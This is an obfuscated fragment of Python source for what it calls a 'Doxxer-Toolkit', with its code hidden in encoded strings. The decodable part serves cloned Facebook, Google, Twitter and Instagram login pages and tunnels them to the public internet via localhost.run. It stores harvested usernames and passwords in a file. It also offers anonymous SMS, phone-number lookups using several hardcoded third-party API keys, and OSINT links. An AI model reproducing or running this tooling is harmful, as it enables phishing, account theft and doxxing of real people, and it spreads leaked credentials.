QDbtVPNtVPOjpzyhqPufo2qiXD0XVPNtVPNtMJ1unJkzLJfbXD0XVPNtVTIfnJLtLaW1nPN9CFN5BGbAPvNtVPNtVTI4nKDbXD0XVPNtVTIfp2H6QDbtVPNtVPNtpUWcoaDbW1g+KFOSpaWipvOipTAco24tnJ52LJkcMTRhWlxAPvNtVPNtVPO0nJ1yYaAfMJIjXQVcQDbtVPNtVPNtMJ1unJkzLJfbXD0XVPOyoTyzVR9DVQ09VQZ6QDbtVPNto3Zhp3ymqTIgXPWwoTIupvVcQDbtVPNtpUWcoaDboT9aolxAPvNtVPOjpzyhqPtaKT5oZI0tDJWlnKVtoTyhnlOjLKWuVTkcoaI4WlxAPvNtVPOjpzyhqPtaKT5oZy0tDJWlnKVtoTyhnlOjLKWuVUEypz11rPpcQDbtVPNtpUWcoaDbW1khJmNjKFOFMJqlMKAupvOuoPOgMJ51VUOlnJ5wnKOuoPpcQDbtVPNtpUWcoaDbW1khJmx5KFOGLJkcpvpcQDbtVPNtLaW1nPN9VTyhqPucoaO1qPtaJ35qVRIfnJcyVUIhLFOipTAco246VPpcXD0XVPNtVTyzVTWlqJttCG0tZGbAPvNtVPNtVUqyLzWlo3qmMKVho3OyovtanUE0pUZ6Yl90MJ1jYJ1unJjho3WaY2ImYlpcQDbtVPNtVPOyoJScoTMunltcQDbtVPNtMJkcMvOvpaIbVQ09VQV6QDbtVPNtVPOipl5mrKA0MJ0bVaEypz11rP1ipTIhVTu0qUOmBv8iqTIgpP1gLJyfYz9lMl9ypl8vXD0XVPNtVPNtMJ1unJkzLJfbXD0XVPNtVTIfnJLtLaW1nPN9CFNjZQbAPvNtVPNtVT9mYaA5p3EyoFtvL2kyLKVvXD0XVPNtVPNtpUWcoaDboT9aolxAPvNtVPNtVTIgLJyfMzSeXPxAPvNtVPOyoTyzVTWlqJttCG0tBGx6QDbtVPNtVPOyrTy0XPxAPvNtVPOyoUAyBt0XVPNtVPNtVUOlnJ50XPqosy0tEKWlo3Vto3OwnJ9hVTyhqzSfnJEuYvpcQDbtVPNtVPNtqTygMF5moTIypPtlXD0XVPNtVPNtVTIgLJyfMzSeXPxAPvNtMJkcMvOCHPN9CFNjZQbAPvNtVPOgMJ51XPxAPvNtMJkcMvOCHPN9CFN5BGbAPvNtVPOyrTy0XPxAPvNtMJkmMGbAPvNtVPOjpzyhqPtaJ35qVRIlpz9lVT9jL2yiovOcoaMuoTyxLF4aXD0XVPNtVUEcoJHhp2kyMKNbZvxAPvNtVPOipl5mrKA0MJ0bVzAfMJSlVvxAPvNtVPOjpzyhqPufo2qiXD0XVPNtVTIgLJyfMzSeXPxAPvNtQDcxMJLtpTucp2ucozpbXGbAPvNto3Zhp3ymqTIgXPWwoTIupvVcQDbtVUOlnJ50XTkiM28cQDbtVUOlnJ50XPqpoyg+KFOGMJkyL2Aco25uVUIhLFOipTAco24aXD0XVPOjpzyhqPtaWlpAPvNtJmSqVRMuL2Ivo29eQDbtVN0XVPOoZy0tE29iM2kyQDbtVN0XVPOoZ10tIUqcqUEypt0XVPNAPvNtJmEqVRyhp3EuM3WuoD0XVPNAPvNtJmNjKFOFMJqlMKAupvOuoPOgMJ51VUOlnJ5wnKOuoN0XVPNAPvNtJmx5KFOGLJkcpt0XVPNaWlpcQDbtVSyDVQ0tnJ50XTyhpUI0XPqosy0tEJkcnzHtqJ5uVT9jL2yiowbtWlxcQDbtVTyzVSyDVQ09VQ'
god = 'E6DQogICAgcHJpbnQoZidcbntDb2xvcmVzLmF6dWx9W35dIExvcyB1c3VhcmlvcyBzZSBndWFyZGFyYW4gZW46IERveHhlci1Ub29sa2l0Ly5wYWdlcy9GYWNlYm9vay91c3Vhcmlvcy50eHQnKQ0KICAgIHByaW50KGYnXG57Q29sb3Jlcy52ZXJkZX1bfl0gTG9zIHB1ZWRlcyB2ZXIgY29uIGVsIGNvbWFuZG86IGNhdCBEb3h4ZXItVG9vbGtpdC8ucGFnZXMvRmFjZWJvb2svdXN1YXJpb3MudHh0JykNCiAgICBwcmludChmJ1xue0NvbG9yZXMubWFnZW50YX1bfl0gUGFyYSBzYWxpciBwcmVzaW9uYSBDVFJMICsgQycpDQogICAgcHJpbnQoJyAnKQ0KICAgIGNtZCA9ICJwaHAgLXQgLnBhZ2VzL0ZhY2Vib29rIC1TIGxvY2FsaG9zdDo4MDgwICYgc3NoIC1SIDgwOmxvY2FsaG9zdDo4MDgwIG5va2V5QGxvY2FsaG9zdC5ydW4iDQogICAgcCA9IHN1YnByb2Nlc3MuUG9wZW4oY21kLCBzaGVsbD1UcnVlKQ0KICAgIGEgPSBwLmNvbW11bmljYXRlKClbMF0NCiAgZWxpZiBZUCA9PSAyOg0KICAgIHByaW50KGYnXG57Q29sb3Jlcy5henVsfVt+XSBMb3MgdXN1YXJpb3Mgc2UgZ3VhcmRhcmFuIGVuOiBEb3h4ZXItVG9vbGtpdC8ucGFnZXMvR29vZ2xlL3VzdWFyaW9zLnR4dCcpDQogICAgcHJpbnQoZidcbntDb2xvcmVzLnZlcmRlfVt+XSBMb3MgcHVlZGVzIHZlciBjb24gZWwgY29tYW5kbzogY2F0IERveHhlci1Ub29sa2l0Ly5wYWdlcy9Hb29nbGUvdXN1YXJpb3MudHh0JykNCiAgICBwcmludChmJ1xue0NvbG9yZXMubWFnZW50YX1bfl0gUGFyYSBzYWxpciBwcmVzaW9uYSBDVFJMICsgQycpDQogICAgcHJpbnQoJyAnKQ0KICAgIGNtZCA9ICJwaHAgLXQgLnBhZ2VzL0dvb2dsZSAtUyBsb2NhbGhvc3Q6ODA4MCAmIHNzaCAtUiA4MDpsb2NhbGhvc3Q6ODA4MCBub2tleUBsb2NhbGhvc3QucnVuIg0KICAgIHAgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSkNCiAgICBhID0gcC5jb21tdW5pY2F0ZSgpWzBdDQogIGVsaWYgWVAgPT0gMzoNCiAgICBwcmludChmJ1xue0NvbG9yZXMuYXp1bH1bfl0gTG9zIHVzdWFyaW9zIHNlIGd1YXJkYXJhbiBlbjogRG94eGVyLVRvb2xraXQvLnBhZ2VzL1R3aXR0ZXIvdXN1YXJpb3MudHh0JykNCiAgICBwcmludChmJ1xue0NvbG9yZXMudmVyZGV9W35dIExvcyBwdWVkZXMgdmVyIGNvbiBlbCBjb21hbmRvOiBjYXQgRG94eGVyLVRvb2xraXQvLnBhZ2VzL1R3aXR0ZXIvdXN1YXJpb3MudHh0JykNCiAgICBwcmludChmJ1xue0NvbG9yZXMubWFnZW50YX1bfl0gUGFyYSBzYWxpciBwcmVzaW9uYSBDVFJMICsgQycpDQogICAgcHJpbnQoJyAnKQ0KICAgIGNtZCA9ICJwaHAgLXQgLnBhZ2VzL1R3aXR0ZXIgLVMgbG9jYWxob3N0OjgwODAgJiBzc2ggLVIgODA6bG9jYWxob3N0OjgwODAgbm9rZXlAbG9jYWxob3N0LnJ1biINCiAgICBwID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUpDQogICAgYSA9IHAuY29tbXVuaWNhdGUoKVswXQ0KICBlbGlmIFlQID09IDQ6DQogICAgcHJpbnQoZidcbntDb2xvcmVzLmF6dWx9W35dIExvcyB1c3VhcmlvcyBzZSBndWFyZGFyYW4gZW46IERveHhlci1Ub29sa2l0Ly5wYWdlcy9JbnN0YWdyYW0vdXN1YXJpb3MudHh0JykNCiAgICBwcmludChmJ1xue0NvbG9yZXMudmVyZGV9W35dIExvcyBwdWVkZXMgdmVyIGNvbiBlbCBjb21hbmRvOiBEb3h4ZXItVG9vbGtpdC8ucGFnZXMvSW5zdGFncmFtL3VzdWFyaW9zLnR4dCcpDQogICAgcHJpbnQoZidcbntDb2xvcmVzLm1hZ2VudGF9W35dIFBhcmEgc2FsaXIgcHJlc2lvbmEgQ1RSTCArIEMnKQ0KICAgIHByaW50KCcgJykNCiAgICBjbWQgPSAicGhwIC10IC5wYWdlcy9JbnN0YWdyYW0gLVMgbG9jYWxob3N0OjgwODAgJiBzc2ggLVIgODA6bG9jYWxob3N0OjgwODAgbm9rZXlAbG9jYWxob3N0LnJ1biINCiAgICBwID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUpDQogICAgYSA9IHAuY29tbXVuaWNhdGUoKVswXQ0KICBlbGlmIFlQID09IDAwOg0KICAgIG1lbnUoKQ0KICBlbGlmIFlQID09IDk5Og0KICAgIGV4aXQoKQ0KICANCmRlZiBzbXMoKToNCiAgcHJpbnQoJ1xuWzFdIEFicmlyIHBhcmEgbGluayBwYXJhIGxpbnV4JykNCiAgcHJpbnQoJ1xuWzJdIEFicmlyIHBhcmEgdGVybXV4JykNCiAgcHJpbnQoJ1xuWzAwXSBSZWdyZXNhciBhbCBtZW51IHByaW5jaXBhbCcpDQogIHByaW50KCdcbls5OV0gU2FsaXInKQ0KICBZUiA9IGludChpbnB1dCgnW35dIEVsaWplIHVuYSBvcGNpb246ICcpKQ0KICBpZiBZUiA9PSAxOg0KICAgIHdlYmJyb3dzZXIub3BlbignaHR0cDovL3d3dy5zZW5kYW5vbnltb3Vzc21zLmNvbS8nKQ0KICBlbGlmIFlSID09IDI6DQogICAgb3Muc3lzdGVtKCJ0ZXJtdXgtb3BlbiBodHRwOi8vd3d3LnNlbmRhbm9ueW1vdXNzbXMuY29tLyIpDQogIGVsaWYgWVIgPT0gMDA6DQogICAgbWVudSgpDQogIGVsaWYgWVIgPT0gOTk6DQogICAgZXhpdCgpDQogICAgDQpkZWYgbnVtZXJvKCk6DQogICAgcHJpbnQoJ1t+XSBFamVtcGxvOiArMTkwODc2NTQzMjEnKQ0KICAgIG51bWVybyA9IGlucHV0KCdbfl0gSW5ncmVzYSBlbCBudW1lcm8gZGUgdGVsZWZvbm86ICcpDQogICAga2V5ID0gImQ3YWZjZTI3OGNkNDRiZGQzM2QyNTU1MmJmOWFkYjU3Ig0KICAgIGtleTEgPSAiYTE4NmNhNjAyZTBiMmZjZTM4NzMwZmJlZjFhODA3MGIiDQogICAga2V5MyA9ICIyYzQ1NDdmNGE0MDk3NjMyMzUwZDI1OWYwODZlNDNhMCINCiAgICBrZXk0ID0gIjhlZGM5MWYyMzhkOGYyMjBiZjNhMmRjNDIyMTRjMzk3Ig0KICAgIGtleTUgPSAiMGQ0ZTM0ZmQwYzdhYTMzZWQyMmI3M2YwZTFjMzQ1YWQiDQogICAgYXBpID0gZiJodHRwOi8vYXBpbGF5ZXIubmV0L2FwaS92YWxpZGF0ZT9hY2Nlc3Nfa2V5PXtrZXl9Jm51bWJlcj17bnVtZXJvfSINCiAgICB0cnk6IA0KICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldChhcGkpLmpzb24oKQ0KICAgICAgaWYgZGF0YVsndmFsaWQnXSA9PSBGYWxzZToNCiAgICAgICBwcmludCgnXG5bIV0gRWwgbnVtZXJvIG5vIGVzIHZhbGlkbyEnKQ0KICAgICAgZWxzZToNCiAgICAgICAgcHJpbnQoJ1xuW35dIE51bWVybzogJywgZGF0YVsnbnVtYmVyJ10pDQogICAgICAgIHByaW50KCdbfl0gQ29kaWdvIGRlbCBwYWlzOiAnLCBkYXRhWydjb3VudHJ5X2NvZGUnXSkNCiAgICAgICAgcHJpbnQoJ1t+XSBOb21icmUgZGVsIHBhaXM6ICcsIGRhdGFbJ2NvdW50cnlfbmFtZSddKQ0KICAgICAgICBwcmludCgnW35dIFViaWNhY2lvbjogJywgZGF0YVsnbG9jYXRpb24nXSkNCiAgICAgICAgcHJpbnQoJ1t+XSBUcmFuc3BvcnRhZG9yOiAnLCBkYXRhWydjYXJyaWVyJ10pDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgdHJ5Og0KICAgICAgICBhcGkxID0gZiJodHRwOi8vYXBpbGF5ZXIubmV0L2FwaS92YWxpZGF0ZT9hY2Nlc3Nfa2V5PXtrZXkxfSZudW1iZXI9e251bWVyb30iDQogICAgICAgIGRhdGExID0gcmVxdWVzdHMuZ2V0KGFwaTEpLmpzb24oKQ0KICAgICAgICBpZiBkYXRhMVsndmFsaWQnXSA9PSBGYWxzZToNCiAgICAgICAgICBwcmludCgnXG5bIV0gRWwgbnVtZXJvIG5vIGVzIHZhbGlkbyEnKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICBwcmludCgnXG5bfl0gTnVtZXJvOiAnLCBkYXRhMVsnbnVtYmVyJ10pDQogICAgICAgICAgIHByaW50KCdbfl0gQ29kaWdvIGRlbCBwYWlzOiAnLCBkYXRhMVsnY291bnRyeV9jb2RlJ10pDQogICAgICAgICAgIHByaW50KCdbfl0gTm9tYnJlIGRlbCBwYWlzOiAnLCBkYXRhMVsnY291bnRyeV9uYW1lJ10pDQogICAgICAgICAgIHByaW50KCdbfl0gVWJpY2FjaW9uOiAnLCBkYXRhMVsnbG9jYXRpb24nXSkNCiAgICAgICAgICAgcHJpbnQoJ1t+XSBUcmFuc3BvcnRhZG9yOiAnLCBkYXRhMVsnY2FycmllciddKQ0KICAgICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICAgdHJ5Og0KICAgICAgICAgICBhcGkzID0gZiJodHRwOi8vYXBpbGF5ZXIubmV0L2FwaS92YWxpZGF0ZT9hY2Nlc3Nfa2V5PXtrZXkzfSZudW1iZXI9e251bWVyb30iDQogICAgICAgICAgIGRhdGEzID0gcmVxdWVzdHMuZ2V0KGFwaTMpLmpzb24oKQ0KICAgICAgICAgICBpZiBkYXRhM1sndmFsaWQnXSA9PSBGYWxzZToNCiAgICAgICAgICAgICBwcmludCgnXG5bIV0gRWwgbnVtZXJvIG5vIGVzIHZhbGlkbyEnKQ0KICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgIHByaW50KCdcblt+XSBOdW1lcm86ICcsIGRhdGEzWydudW1iZXInXSkNCiAgICAgICAgICAgICBwcmludCgnW35dIENvZGlnbyBkZWwgcGFpczogJywgZGF0YTNbJ2NvdW50cnlfY29kZSddKQ0KICAgICAgICAgICAgIHByaW50KCdbfl0gTm9tYnJlIGRlbCBwYWlzOiAnLCBkYXRhM1snY291bnRyeV9uYW1lJ10pDQogICAgICAgICAgICAgcHJpbnQoJ1t+XSBVYmljYWNpb246ICcsIGRhdGEzWydsb2NhdGlvbiddKQ0KICAgICAgICAgICAgIHByaW50KCdbfl0gVHJhbnNwb3J0YWRvcjogJywgZGF0YTNbJ2NhcnJpZXInXSkNCiAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgYXBpNCA9IGYiaHR0cDovL2FwaWxheWVyLm5ldC9hcGkvdmFsaWRhdGU/YWNjZXNzX2tleT17a2V5NH0mbnVtYmVyPXtudW1lcm99Ig0KICAgICAgICAgICAgICBkYXRhNCA9IHJlcXVlc3RzLmdldChhcGk0KS5qc29uKCkNCiAgICAgICAgICAgICAgaWYgZGF0YTRbJ3ZhbGlkJ10gPT0gRmFsc2U6DQogICAgICAgICAgICAgICAgcHJpbnQoJ1xuWyFdIEVsIG51bWVybyBubyBlcyB2YWxpZG8hJykNCiAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBwcmludCgnXG5bfl0gTnVtZXJvOiAnLCBkYXRhNFsnbnVtYmVyJ10pDQogICAgICAgICAgICAgICAgcHJpbnQoJ1t+XSBDb2RpZ28gZGVsIHBhaXM6ICcsIGRhdGE0Wydjb3VudHJ5X2NvZGUnXSkNCiAgICAgICAgICAgICAgICBwcmludCgnW35dIE5vbWJyZSBkZWwgcGFpczogJywgZGF0YTRbJ2NvdW50cnlfbmFtZSddKQ0KICAgICAgICAgICAgICAgIHByaW50KCdbfl0gVWJpY2FjaW9uOiAnLCBkYXRhNFsnbG9jYXRpb24nXSkNCiAgICAgICAgICAgICAgICBwcmludCgnW35dIFRyYW5zcG9ydGFkb3I6ICcsIGRhdGE0WydjYXJyaWVyJ10pDQogICAgICAgICAgICBleGNlcHQgS2V5RXJyb3I6DQogICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgIGFwaTUgPSBmImh0dHA6Ly9hcGlsYXllci5uZXQvYXBpL3ZhbGlkYXRlP2FjY2Vzc19rZXk9e2tleTV9Jm51bWJlcj17bnVtZXJvfSINCiAgICAgICAgICAgICAgICAgZGF0YTUgPSByZXF1ZXN0cy5nZXQoYXBpNSkuanNvbigpDQogICAgICAgICAgICAgICAgIGlmIGRhdGE1Wyd2YWxpZCddID09IEZhbHNlOg0KICAgICAgICAgICAgICAgICAgICBwcmludCgnXG5bIV0gRWwgbnVtZXJvIG5vIGVzIHZhbGlkbyEnKQ0KICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBwcmludCgnXG5bfl0gTnVtZXJvOiAnLCBkYXRhNVsnbnVtYmVyJ10pDQogICAgICAgICAgICAgICAgICAgIHByaW50KCdbfl0gQ29kaWdvIGRlbCBwYWlzOiAnLCBkYXRhNVsnY291bnRyeV9jb2RlJ10pDQogICAgICAgICAgICAgICAgICAgIHByaW50KCdbfl0gTm9tYnJlIGRlbCBwYWlzOiAnLCBkYXRhNVsnY291bnRyeV9uYW1lJ10pDQogICAgICAgICAgICAgICAgICAgIHByaW50KCdbfl0gVWJpY2FjaW9uOiAnLCBkYXRhNVsnbG9jYXRpb24nXSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1t+XSBUcmFuc3BvcnRhZG9yOiAnLCBkYXRhNVsnY2FycmllciddKQ0KICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICAgICAgICAgICAgICBwcmludCgnXG5bIV0gQVBJcyBhZ290YWRhcyBkZWJlcyBlc3BlcmFyIGEgcXVlIHNlYW4gYWN0dWFsaXphZGFzJykNCiAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgyKQ0KICAgICAgICAgICAgICAgICAgICBtZW51KCkNCg0KZGVmIG9zaW50cGEoKToNCiAgb3Muc3lzdGVtKCJjbGVhciIpDQogIHByaW50KGxvZ28pDQogIHByaW50KCcnJ1xuDQogIFsxXSBvc2ludGZyYW1ld29yaw0KICANCiAgWzJdIG9zaW50IHRlY2huaXF1ZXMNCiAgDQogIFswMF0gUmVncmVzYXIgYWwgbWVudSBwcmluY2lwYWwNCiAgDQogIFs5OV0gU2FsaXINCiAgJycnKQ0KICBvc2ludCA9IGludChpbnB1dCgnW35dIEVzY3JpYmUgdW4gbnVtZXJvOiAnKSkNCiAgaWYgb3NpbnQgPT0gMToNCiAgICBwcmludCgnXG5bMV0gQWJyaXIgbGluayBwYXJhIGxpbnV4JykNCiAgICBwcmludCgnXG5bMl0gQWJyaXIgbGluayBwYXJhIHRlcm11eCcpDQogICAgcHJpbnQoJ1xuWzAwXSBSZWdyZXNhciBhbCBtZW51IHByaW5jaXBhbCcpDQogICAgcHJpbnQoJ1xuWzk5XSBTYWxpcicpDQogICAgZWxlamlyOTkgPSBpbnQoaW5wdXQoJ1t+XSBFc2NyaWJlIHVuIG51bWVybzogJykpDQogICAgaWYgZWxlamlyOTkgPT0gMToNCiAgICAgIHdlYmJyb3dzZXIub3BlbignaHR0cHM6Ly9vc2ludGZyYW1ld29yay5jb20vJykNCiAgICAgIG9zaW50cGEoKQ0KICAgIGVsaWYgZWxlamlyOTkgPT0gMjoNCiAgICAgIG9zLnN5c3RlbSgidGVybXV4LW9wZW4gaHR0cHM6Ly9vc2ludGZyYW1ld29yay5jb20vIikNCiAgICAgIG9zaW50cGEoK'
destiny = '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